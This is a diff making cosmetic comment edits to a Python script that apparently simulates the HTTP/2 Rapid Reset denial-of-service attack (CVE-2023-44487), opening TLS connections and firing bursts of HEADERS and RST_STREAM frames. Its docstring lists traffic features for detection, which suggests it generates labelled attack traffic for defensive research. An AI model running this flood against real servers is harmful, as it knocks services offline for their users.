@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-http2_rapid_reset.py — CVE-2023-44487 HTTP/2 Rapid Reset simulation.
+http2_rapid_reset.py - CVE-2023-44487 HTTP/2 Rapid Reset simulation.
 
 Opens TLS connections, negotiates HTTP/2 via ALPN, then sends HEADERS +
 RST_STREAM for each stream immediately without waiting for a response.
@@ -11,7 +11,7 @@ attacker to submit an unbounded number of cancelled requests.
 OIF signature: rst_flag_cnt very high (one RST per stream per connection),
 flow_duration_s short to moderate (TLS handshake + burst of resets),
 psh_flag_cnt near zero (no HTTP data frames sent), init_fwd_win_bytes
-normal (legitimate TLS handshake — distinguishes this from a SYN flood).
+normal (legitimate TLS handshake, which distinguishes this from a SYN flood).
 """
 
 import ssl
@@ -54,7 +54,7 @@ for i in range(CONNS):
         tls.sendall(conn.data_to_send(65535))
 
         # Read server preface so the connection is fully established before
-        # we start sending streams — avoids GOAWAY on incomplete handshake.
+        # sending streams; skipping this causes a GOAWAY on incomplete handshake.
         data = tls.recv(65535)
         conn.receive_data(data)
         pending = conn.data_to_send(65535)
@@ -75,7 +75,7 @@ for i in range(CONNS):
         tls.close()
         raw.close()
     except Exception:
-        # Connection refused, TLS error, timeout — keep going.
+        # Connection refused, TLS error, timeout: keep going.
         pass
 
 print(f"[attack] Done: {CONNS} connections")
